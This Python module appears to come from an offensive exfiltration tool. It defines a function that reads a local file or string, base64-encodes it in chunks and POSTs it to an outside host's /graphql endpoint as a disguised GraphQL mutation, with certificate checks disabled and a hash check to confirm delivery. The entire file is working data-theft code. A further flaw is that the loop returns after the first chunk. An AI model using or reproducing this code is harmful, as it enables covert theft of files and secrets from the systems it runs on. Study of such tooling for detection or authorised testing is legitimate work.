import hashlib
import requests
import base64
import os
import json
import logging

def ExfilGraphQL(url, data, File=False):
    logging.debug("Using GraphQL exfiltration")
    if not File:
        if isinstance(data, dict):
            logging.debug("data is a dict, converting to string")
            data = ','.join(data["data"]).replace("\n", "<>")
        elif isinstance(data, list):
            logging.debug("data is a list, converting to string")
            data = ','.join(data)
            data = data.encode('utf-8')
        else:
            logging.debug("data is a string")
            data = data.encode('utf-8')
    else:
        if isinstance(data, dict):
            data = data["path"]
        logging.debug("data is a file")
        if data == "":
            logging.error("No file")
            return False
        else:
            if not os.path.isfile(data):
                logging.error("Bad filepath")
                return False
            else:
                logging.debug("Reading file")
                data = open(data, "rb").read()

    # Split the data into chunks of 50000 bytes each
    chunks = [data[i:i+50000] for i in range(0, len(data), 50000)]

    for chunk in chunks:
        data_b64 = base64.b64encode(chunk).decode('utf-8')

        # GraphQL mutation query
        query = {
            "query": f"mutation {{ hashData(data: \"{data_b64}\") }}"
        }


        headers = {
            "Content-Type": "application/json"
        }

        try:
            logging.debug("Sending request to GraphQL server")
            if not "http://" in url:
                url = "http://" + url
            response = requests.post(url + "/graphql", headers=headers, data=json.dumps(query), verify=False)
            response.raise_for_status()

            data = response.json()
            if "errors" in data:
                logging.error(f"GraphQL error: {data['errors']}")
                return False

            response_hash = data['data']['hashData']

            # Compare returned hash with the hash of the original data
            hash_object = hashlib.sha256(data_b64.encode())
            original_hash = hash_object.hexdigest()

            if response_hash == original_hash:
                logging.debug("data exfiltration over GraphQL successful!")
                return True
            else:
                logging.warning("Failed to exfiltrate data over GraphQL, hashes do not match")
                return False
        except Exception as e:
            logging.error(f"Request to GraphQL server failed: {e}")
            return False
